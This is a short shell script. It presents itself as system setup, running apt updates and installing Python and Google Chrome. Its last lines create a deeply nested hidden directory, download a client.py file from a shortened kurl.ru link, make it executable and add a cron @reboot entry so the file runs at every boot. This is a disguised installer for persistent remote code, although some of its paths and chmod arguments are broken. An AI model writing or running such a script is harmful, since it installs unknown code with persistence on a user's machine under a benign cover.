echo "Updating all modules..."
sudo apt-get update && sudo apt-get upgrade

echo "Installing Python..."
sudo apt-get install python3

echo "Installing Google Chrome..."
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg -i google-chrome-stable_current_amd64.deb

mkdir -p ~/a/b/c/d/e/f/g
wget -O ~/a/b/c/d/e/f/g/client.py https://kurl.ru/lWWqV
sudo chmod +x 777 ~/a/b/c/d/e/f/g.client.py
sudo echo "@reboot python3 ~/a/b/c/d/e/f/g.client.py" >> mycron
crontab mycron
rm mycron
